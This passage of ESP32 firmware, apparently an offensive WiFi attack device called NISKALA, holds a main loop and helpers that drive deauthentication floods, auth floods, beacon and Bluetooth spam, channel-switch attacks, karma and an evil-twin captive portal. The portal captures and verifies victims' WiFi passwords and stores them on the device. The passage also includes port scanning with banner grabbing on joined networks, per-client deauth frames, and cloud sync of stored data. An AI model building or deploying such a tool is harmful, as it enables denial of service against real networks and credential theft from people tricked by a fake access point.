    tft.printf("%u/%u host:%u", (unsigned)g_reconScanned, (unsigned)g_reconTotal, (unsigned)g_reconHostCount);

    if (g_reconNext > g_reconLast || g_reconNext == 0) {
      g_reconPhase = RECON_PHASE_HOST_LIST;
      drawNetworkRecon();
    }
  } else if (g_reconPhase == RECON_PHASE_PORT_SCAN) {
    static const int ports[RECON_MAX_PORTS] = {21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 9200};
    if (g_reconPortIndex < RECON_MAX_PORTS) {
      int port = ports[g_reconPortIndex++];
      tft.fillRect(0, 60, 240, 12, TFT_BLACK);
      tft.setCursor(10, 60);
      tft.printf("Cek TCP %d...", port);
      if (g_reconClient.connect(g_reconSelectedIP, port, 150)) {
        if (g_reconOpenPortCount < RECON_MAX_PORTS) {
          g_reconOpenPorts[g_reconOpenPortCount++] = port;
        }
        g_reconClient.stop();
      }
    } else {
      g_reconBannerIndex = 0;
      g_reconPhase = RECON_PHASE_BANNER;
      tft.fillRect(0, 60, 240, 12, TFT_BLACK);
      tft.setCursor(10, 60);
      tft.print("Ambil banner...");
    }
  } else if (g_reconPhase == RECON_PHASE_BANNER) {
    if (g_reconBannerIndex < g_reconOpenPortCount) {
      int port = g_reconOpenPorts[g_reconBannerIndex];
      tft.fillRect(0, 60, 240, 12, TFT_BLACK);
      tft.setCursor(10, 60);
      tft.printf("Banner TCP %d...", port);

      WiFiClient bc;
      if (bc.connect(g_reconSelectedIP, port, 300)) {
        unsigned long st = millis();
        int n = 0;
        while (bc.available() && n < 39 && (millis() - st) < 250) {
          char ch = bc.read();
          if (ch == '\n' || ch == '\r') break;
          g_reconBanners[g_reconBannerIndex][n++] = ch;
        }
        g_reconBanners[g_reconBannerIndex][n] = 0;
        bc.stop();
      } else {
        g_reconBanners[g_reconBannerIndex][0] = 0;
      }
      g_reconBannerIndex++;
    } else {
      g_reconPhase = RECON_PHASE_PORT_RESULT;
      drawNetworkRecon();
    }
  }
}
void stopNetworkRecon() {
  isReconRunning = false;
  g_reconClient.stop();
  g_reconPhase = RECON_PHASE_HOST_LIST;
  resetWifiStateAfterAttack();
  Serial.println("[RECON] Berhenti");
}

bool apWifiAdd(String ssid, String pass) {
  if (ssid.length() == 0 || pass.length() == 0) return false;
  int count = apPrefs.getInt("count", 0);
  for (int i = 0; i < count; i++) {
    String key = "ssid_" + String(i);
    if (apPrefs.getString(key.c_str(), "") == ssid) {
      apPrefs.putString(("pass_" + String(i)).c_str(), pass);
      return true;
    }
  }
  if (count >= MAX_AP_WIFI) return false;
  apPrefs.putString(("ssid_" + String(count)).c_str(), ssid);
  apPrefs.putString(("pass_" + String(count)).c_str(), pass);
  apPrefs.putInt("count", count + 1);
  return true;
}

String apWifiFindPassword(String ssid) {
  if (ssid.length() == 0) return "";
  int count = apPrefs.getInt("count", 0);
  for (int i = 0; i < count; i++) {
    if (apPrefs.getString(("ssid_" + String(i)).c_str(), "") == ssid) {
      return apPrefs.getString(("pass_" + String(i)).c_str(), "");
    }
  }
  return "";
}

void apWifiList() {
  int count = apPrefs.getInt("count", 0);
  Serial.printf("[APWIFI] %d kredensial\n", count);
  for (int i = 0; i < count; i++) {
    Serial.printf("  %2d  %s  %s\n", i,
      apPrefs.getString(("ssid_" + String(i)).c_str(), "(?)").c_str(),
      apPrefs.getString(("pass_" + String(i)).c_str(), "").c_str());
  }
}

bool apWifiDelete(int idx) {
  int count = apPrefs.getInt("count", 0);
  if (idx < 0 || idx >= count) return false;
  for (int i = idx; i < count - 1; i++) {
    apPrefs.putString(("ssid_" + String(i)).c_str(), apPrefs.getString(("ssid_" + String(i + 1)).c_str(), ""));
    apPrefs.putString(("pass_" + String(i)).c_str(), apPrefs.getString(("pass_" + String(i + 1)).c_str(), ""));
  }
  apPrefs.remove(("ssid_" + String(count - 1)).c_str());
  apPrefs.remove(("pass_" + String(count - 1)).c_str());
  apPrefs.putInt("count", count - 1);
  return true;
}

String findReconPasswordForSSID(String ssid) {
  if (ssid.length() == 0) return "";
  String apPass = apWifiFindPassword(ssid);
  if (apPass.length() > 0) return apPass;
  if (ssid == cfg_wifi_ssid && cfg_wifi_pass.length() > 0) return cfg_wifi_pass;
  int total = prefs.getInt("pwd_count", 0);
  for (int i = 0; i < total; i++) {
    String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
    int p1 = entry.indexOf('|');
    if (p1 <= 0) continue;
    String email = entry.substring(0, p1);
    String pass = entry.substring(p1 + 1);
    if (email == ssid && pass.length() > 0) return pass;
  }
  return "";
}

void startNetworkRecon() {
  isReconRunning = true;
  g_reconHostCount = 0;
  g_reconSelection = 0;
  g_reconScroll = 0;
  g_reconOpenPortCount = 0;
  g_reconPortIndex = 0;
  g_reconBannerIndex = 0;
  memset(g_reconBanners, 0, sizeof(g_reconBanners));
  g_reconPhase = RECON_PHASE_CONNECTING;

  String ssid = targetSSID;
  tft.fillScreen(TFT_BLACK);
  drawHeader("NETWORK RECON", TFT_NAVY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(10, 40);

  if (ssid.length() == 0) {
    tft.println("SSID hidden/tidak valid.");
    tft.println("Tidak bisa recon.");
    isReconRunning = false;
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }

  String pass = findReconPasswordForSSID(ssid);
  bool openNetwork = (g_reconSelectedAuth == 0);
  if (pass.length() == 0 && !openNetwork) {
    tft.println("Password target belum");
    tft.println("tersimpan.");
    tft.println("");
    tft.println("Set via CLI:");
    tft.println("config set ssid=<SSID> pass=<PASS>");
    isReconRunning = false;
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }

  tft.print("Hubung WiFi: ");
  tft.println(ssid.substring(0, 18));
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  WiFi.begin(ssid.c_str(), pass.c_str());
  g_reconConnectStart = millis();
}
void setup() {
  Serial.begin(115200);
  randomSeed(esp_random());
  delay(300);
  Serial.println();
  Serial.println("==== NISKALA v" FW_VERSION " ====");
  Serial.printf("Chip : %s rev %d\n", ESP.getChipModel(), ESP.getChipRevision());
  Serial.printf("Heap : %u bytes\n", ESP.getFreeHeap());

  pinMode(BTN_TOP, INPUT_PULLUP);
  pinMode(BTN_BOTTOM, INPUT_PULLUP);
  analogSetPinAttenuation(BAT_PIN, ADC_11db);
  prefs.begin("deauther", false);
  apPrefs.begin("deauther_ap", false);

  cfg_deauth_burst = prefs.getInt("cfg_deauth", 5);
  cfg_auth_burst = prefs.getInt("cfg_auth", 20);
  cfg_hop_interval_ms = prefs.getInt("cfg_hop", 120);
  cfg_beacon_hop_ms = prefs.getInt("cfg_beacon", 100);
  cfg_deauth_reason = prefs.getInt("cfg_reason", 0);
  { String _s = prefs.getString("wifi_ssid", ""); if (_s.length() > 0) cfg_wifi_ssid = _s; }
  { String _s = prefs.getString("wifi_pass", ""); if (_s.length() > 0) cfg_wifi_pass = _s; }
  { String _s = prefs.getString("srv_url", ""); if (_s.length() > 0) cfg_server_url = _s; }
  { String _s = prefs.getString("tpl_url", ""); if (_s.length() > 0) cfg_template_url = _s; }
  cfg_autosync_min = prefs.getInt("autosync", 0);
  lastAutoSync = millis();

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound(handleNotFound);
  setupWebRemote();

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);

  Serial.println("[1/4] Splash...");
  drawElegantSplash();

  Serial.println("[2/4] Disclaimer...");
  showDisclaimerFlow();

  WiFi.mode(WIFI_AP_STA);
  esp_wifi_get_mac(WIFI_IF_AP, g_originalApMac);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  Serial.println("[3/4] Start attack task...");
  xTaskCreatePinnedToCore(
    attackTask, "attack", 4096, NULL, 2, &attackTaskHandle, 0
  );

  Serial.println("[4/4] Draw main menu...");
  drawMainMenu();

  Serial.println("Setup selesai, heap tersisa: " + String(ESP.getFreeHeap()));
  Serial.println("Ketik 'help' untuk CLI (Serial Monitor 115200).");
  lastActivity = millis();
}

// ═══════════════════════════════════════════════
// Loop
// ═══════════════════════════════════════════════
static unsigned long lastUI = 0;
static int animFrame = 0;

void loop() {
  handleSerialCLI();

  // ---- Screensaver (dim + particle orbit) ----
  bool anyBtn = (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW);
  if (screensaverActive) {
    if (anyBtn) {
      screensaverActive = false;
      setBacklight(BL_FULL);
      lastActivity = millis();
      if (currentState == MAIN_MENU) drawMainMenu();
      delay(200);
      return;
    }
    if (millis() - lastScreensaverDraw > 50) {
      drawPlanetSystem(screensaverFrame++);
      lastScreensaverDraw = millis();
    }
    return;
  }
  if (anyBtn) lastActivity = millis();
  if (currentState == MAIN_MENU && millis() - lastActivity > SCREENSAVER_IDLE_MS) {
    screensaverActive = true;
    screensaverFrame = 0;
    setBacklight(BL_DIM);
    drawPlanetSystem(0);
    return;
  }
  // ---- end screensaver ----

  // Non-blocking transient info (verification result hold)
  if (transientActive) {
    if (transientMode == 2) {
      dnsServer.processNextRequest();
      server.handleClient();
    }
    if (millis() > transientUntil) {
      transientActive = false;
      if (transientMode == 1) {
        currentState = MAIN_MENU;
        drawMainMenu();
      } else {
        drawEvilTwinRunning(0);
      }
    }
    return;
  }

  // ── KARMA_SCAN ──
  if (currentState == KARMA_SCAN && isKarmaRunning) {
    if (millis() - lastUI > 200) { drawKarmaScan(animFrame++); lastUI = millis(); }

    if (millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopKarmaScan();
      sortKarmaSSIDs();
      karmaSelection = 0;
      karmaScrollPos = 0;
      currentState = KARMA_RESULTS;
      drawKarmaResults();
      return;
    }

    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopKarmaScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── KARMA_RESULTS ──
  if (currentState == KARMA_RESULTS) {
    handleKarmaResults();
    return;
  }

  // ── EVIL_TWIN: success ──
  if (verifyState == 2 && isEvilTwinRunning) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 400) {
      tft.fillScreen(TFT_BLACK);
      drawHeader("PASSWORD BENAR!", TFT_GREEN);
      tft.setTextFont(2); tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("Verifikasi sukses.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 62); tft.println("Target akan dilepas");
      int remain = (releaseAfterSuccess > millis()) ?
                   ((releaseAfterSuccess - millis()) / 1000 + 1) : 0;
      tft.setCursor(10, 82);
      tft.print("dalam "); tft.print(remain); tft.println(" detik...");
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.setCursor(10, 102); tft.print("Pass:");
      drawWrapped(capturedPass, 70, 102, 160, TFT_WHITE, 14);
      lastUI = millis();
    }
    if (millis() > releaseAfterSuccess) {
      stopEvilTwin();
      verifyState = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
    return;
  }

  // ── EVIL_TWIN: verifying ──
  if (isVerifying) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    updateVerification();
    if (millis() - lastUI > 200) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── EVIL_TWIN: normal ──
  if (isEvilTwinRunning) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU;
      drawMainMenu();
      return;
    }
    if (isReleasing) {
      if (millis() - releaseTimer > RELEASE_DELAY_MS) {
        beginVerification();
        return;
      }
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (millis() - lastUI > 150) { drawEvilTwinRunning(animFrame++); lastUI = millis(); }
    return;
  }

  // ── CSA ──
  if (currentState == CSA_RUNNING && isCSARunning) {
    if (millis() - lastUI > 180) { drawCSARunning(animFrame++); lastUI = millis(); }
  }

  // ── Fitur lain ──
  if (currentState == DEAUTH_MENU && isDeauthRunning) {
    if (millis() - lastUI > 200) { drawDeauthMenu(); lastUI = millis(); }
  }
  if (currentState == GLOBAL_DEAUTH && isGlobalDeauthRunning) {
    if (millis() - lastUI > 150) { drawGlobalDeauth(animFrame++); lastUI = millis(); }
  }
  if (currentState == AUTH_FLOOD_RUNNING && isAuthFloodRunning) {
    if (millis() - lastUI > 200) { drawAuthFlood(animFrame++); lastUI = millis(); }
  }
  if (currentState == BEACON_SPAM && isBeaconRunning) {
    if (millis() - lastUI > 180) { drawBeaconSpam(animFrame++); lastUI = millis(); }
  }
  if (currentState == PROBE_SNIFF && isProbeRunning) {
    if (millis() - lastUI > 250) { drawProbeSniff(animFrame++); lastUI = millis(); }
  }
  if (currentState == BT_SPAM && isBTSpamRunning) {
    btSpamTick();
    if (millis() - lastUI > 200) { drawBTSpam(animFrame++); lastUI = millis(); }
  }
  if (currentState == MACRO_RUNNING && isMacroRunning) {
    macroTick();
  }

  if (currentState == MAIN_MENU) {
    if (cfg_autosync_min > 0 && (millis() - lastAutoSync) >= (unsigned long)cfg_autosync_min * 60000UL) {
      lastAutoSync = millis();
      currentState = CLOUD_SYNC;
      startCloudSync();
    }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      menuSelection = (menuSelection + 1) % MENU_COUNT;
      if (menuSelection >= menuScrollPos + 4) menuScrollPos = menuSelection - 3;
      else if (menuSelection < menuScrollPos) menuScrollPos = menuSelection;
      drawMainMenu();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      switch (menuSelection) {
        case 0: case 1: case 5:
          startApScan(menuSelection);
          break;
        case 2:
          currentState = BEACON_SPAM;
          startBeaconSpam();
          drawBeaconSpam(0);
          break;
        case 3:
          currentState = PROBE_SNIFF;
          startProbeSniffer();
          drawProbeSniff(0);
          break;
        case 4:
          currentState = GLOBAL_DEAUTH;
          startGlobalDeauth();
          drawGlobalDeauth(0);
          break;
        case 6:
          currentState = BT_SPAM;
          startBTSpam();
          drawBTSpam(0);
          break;
        case 7:
          currentState = VIEW_PASSWORDS;
          viewSelection = 0; viewScrollPos = 0; confirmDeleteAll = false;
          if (prefs.getInt("pwd_count", 0) == 0) viewSelection = 1;
          drawViewPasswords();
          break;
        case 8:
          currentState = KARMA_SCAN;
          startKarmaScan();
          drawKarmaScan(0);
          break;
        case 9:
          startApScan(9);
          break;
        case 10:
          currentState = WEB_REMOTE;
          startWebRemote();
          break;
        case 11:
          currentState = OTA_MODE;
          startOTA();
          break;
        case 12:
          currentState = BLE_SCAN;
          startBLEScan();
          break;
        case 13:
          currentState = CLOUD_SYNC;
          startCloudSync();
          break;
        case 14:
          currentState = MACRO_MENU;
          macroSelection = 0;
          drawMacroMenu();
          break;
        case 15:
          startApScan(15);
          break;
        case 16:
          startApScan(16);
          break;
        case 17:
          currentState = APWIFI_VIEW;
          apWifiSelection = 0;
          apWifiScrollPos = 0;
          confirmApWifiDelete = false;
          drawApWifiView();
          break;
      }
    }
  }
  else if (currentState == AP_SCANNING) {
    apScanTick();
  }
  else if (currentState == AP_LIST_DEAUTH ||
           currentState == AP_LIST_EVIL_TWIN ||
           currentState == AP_LIST_AUTH_FLOOD ||
           currentState == AP_LIST_CSA ||
           currentState == AP_LIST_CLIENT ||
           currentState == RECON_AP_SELECT) {
    handleAPListNavigation();
  }
  else if (currentState == FETCH_TEMPLATE) {
    templateFetchTick();
    if (currentState == FETCH_TEMPLATE && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      WiFi.mode(WIFI_STA);
      currentState = TEMPLATE_SELECT;
      drawTemplateSelect();
    }
  }
  else if (currentState == TEMPLATE_SELECT) {
    handleTemplateSelect();
  }
  else if (currentState == DEAUTH_MENU) {
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine(); else startDeauthEngine();
      drawDeauthMenu();
    }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      if (isDeauthRunning) stopDeauthEngine();
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CSA_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopCSAAttack();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == EVIL_TWIN_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopEvilTwin();
      verifyState = 0;
      verifyAttempts = 0;
      currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BEACON_SPAM) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopBeaconSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == PROBE_SNIFF) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopProbeSniffer(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == GLOBAL_DEAUTH) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopGlobalDeauth(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == AUTH_FLOOD_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopAuthFlood(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == BT_SPAM) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
    }
  }
  else if (currentState == CLOUD_SYNC) {
    cloudSyncTick();
    if (currentState == CLOUD_SYNC && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
      delay(200);
      WiFi.disconnect();
      restoreOriginalApMac();
      WiFi.mode(WIFI_STA);
      g_cloudPhase = CLOUD_PHASE_IDLE;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == WEB_REMOTE) {
    if (isKarmaRunning && millis() - karmaScanStart > KARMA_SCAN_DURATION_MS) {
      stopAttacksKeepWebRemote();
      currentState = WEB_REMOTE;
      Serial.println("[KARMA] Web scan selesai, AP kontrol tetap aktif");
    }
    dnsServer.processNextRequest();
    server.handleClient();
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopWebRemote();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == OTA_MODE) {
    ArduinoOTA.handle();
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopOTA();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == BLE_SCAN) {
    if (g_bleScanning && millis() - lastUI > 500) { drawBleScan(); lastUI = millis(); }
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopBLEScan();
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == MACRO_MENU) {
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      macroSelection = (macroSelection + 1) % MACRO_COUNT;
      drawMacroMenu();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      startMacro(macroSelection);
    }
  }
  else if (currentState == MACRO_RUNNING) {
    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
      delay(300);
      stopAllAttacks();
      isMacroRunning = false;
      currentState = MAIN_MENU;
      drawMainMenu();
    }
  }
  else if (currentState == CLIENT_MONITOR_RUNNING) {
    if (millis() - lastUI > 500) { drawClientMonitor(); lastUI = millis(); }
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      clientSelection++;
      if (clientSelection > g_clientCount) clientSelection = 0;
      if (clientSelection < clientScroll) clientScroll = clientSelection;
      else if (clientSelection >= clientScroll + 4) clientScroll = clientSelection - 3;
      drawClientMonitor();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (clientSelection == g_clientCount) {
        stopClientMonitor();
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (g_clientCount > 0 && clientSelection < g_clientCount) {
        uint8_t* cmac = g_clients[clientSelection].mac;
        for (int i = 0; i < cfg_deauth_burst; i++) {
          sendDeauthFrame(cmac, g_targetBSSID, 0x07);
        }
        Serial.printf("[CLIENT] Deauth %02X:%02X:%02X:%02X:%02X:%02X\n",
          cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
        tft.fillRect(0, 104, 240, 10, TFT_BLACK);
        tft.setTextFont(1);
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.setCursor(4, 104);
        tft.print("DEAUTH OK");
      }
    }
  }
  else if (currentState == RECON) {
    if (g_reconPhase == RECON_PHASE_HOST_LIST) {
      if (digitalRead(BTN_TOP) == LOW) {
        delay(200);
        g_reconSelection++;
        if (g_reconSelection > g_reconHostCount) g_reconSelection = 0;
        if (g_reconSelection < g_reconScroll) g_reconScroll = g_reconSelection;
        else if (g_reconSelection >= g_reconScroll + 4) g_reconScroll = g_reconSelection - 3;
        drawNetworkRecon();
      }
      if (digitalRead(BTN_BOTTOM) == LOW) {
        delay(200);
        if (g_reconSelection == g_reconHostCount) {
          stopNetworkRecon();
          currentState = MAIN_MENU;
          drawMainMenu();
        } else if (g_reconHostCount > 0 && g_reconSelection < g_reconHostCount) {
          reconPortScan(g_reconSelection);
        }
      }
    } else if (g_reconPhase == RECON_PHASE_PORT_RESULT) {
      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
        delay(300);
        g_reconPhase = RECON_PHASE_HOST_LIST;
        drawNetworkRecon();
      }
    } else {
      reconTick();
      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
        delay(300);
        stopNetworkRecon();
        currentState = MAIN_MENU;
        drawMainMenu();
      }
    }
  }
  else if (currentState == APWIFI_VIEW) {
    int count = apPrefs.getInt("count", 0);
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200);
      confirmApWifiDelete = false;
      apWifiSelection++;
      if (apWifiSelection > count) apWifiSelection = 0;
      if (apWifiSelection < apWifiScrollPos) apWifiScrollPos = apWifiSelection;
      else if (apWifiSelection >= apWifiScrollPos + 3) apWifiScrollPos = apWifiSelection - 2;
      drawApWifiView();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (apWifiSelection == count) {
        confirmApWifiDelete = false;
        currentState = MAIN_MENU;
        drawMainMenu();
      } else if (count > 0 && apWifiSelection < count) {
        if (!confirmApWifiDelete) {
          confirmApWifiDelete = true;
          lastApWifiDeletePress = millis();
          drawApWifiView();
        } else {
          apWifiDelete(apWifiSelection);
          confirmApWifiDelete = false;
          int newCount = apPrefs.getInt("count", 0);
          if (newCount == 0) apWifiSelection = 0;
          else if (apWifiSelection >= newCount) apWifiSelection = newCount;
          apWifiScrollPos = 0;
          drawApWifiView();
        }
      }
    }
    if (confirmApWifiDelete && millis() - lastApWifiDeletePress > 3000) {
      confirmApWifiDelete = false;
      drawApWifiView();
    }
  }
  else if (currentState == VIEW_PASSWORDS) {
    int total = prefs.getInt("pwd_count", 0);
    int maxSelection = total + 1;
    if (digitalRead(BTN_TOP) == LOW) {
      delay(200); confirmDeleteAll = false;
      viewSelection++;
      if (viewSelection > maxSelection) viewSelection = 0;
      if (viewSelection < total) {
        if (viewSelection >= viewScrollPos + 2) viewScrollPos = viewSelection - 1;
        else if (viewSelection < viewScrollPos) viewScrollPos = viewSelection;
      }
      drawViewPasswords();
    }
    if (digitalRead(BTN_BOTTOM) == LOW) {
      delay(200);
      if (viewSelection == maxSelection) { currentState = MAIN_MENU; drawMainMenu(); }
      else if (viewSelection == total) {
        if (!confirmDeleteAll) { confirmDeleteAll = true; lastDeletePress = millis(); drawViewPasswords(); }
        else { deleteAllPasswordsFromNVS(); confirmDeleteAll = false; viewSelection = 1; viewScrollPos = 0; drawViewPasswords(); }
      }
      else if (viewSelection < total) {
        deletePasswordEntry(viewSelection);
        confirmDeleteAll = false;
        int newTotal = prefs.getInt("pwd_count", 0);
        if (newTotal == 0) viewSelection = 1;
        else if (viewSelection >= newTotal) viewSelection = newTotal - 1;
        viewScrollPos = 0;
        drawViewPasswords();
      }
    }
    if (confirmDeleteAll && millis() - lastDeletePress > 3000) {
      confirmDeleteAll = false; drawViewPasswords();
    }
  }
}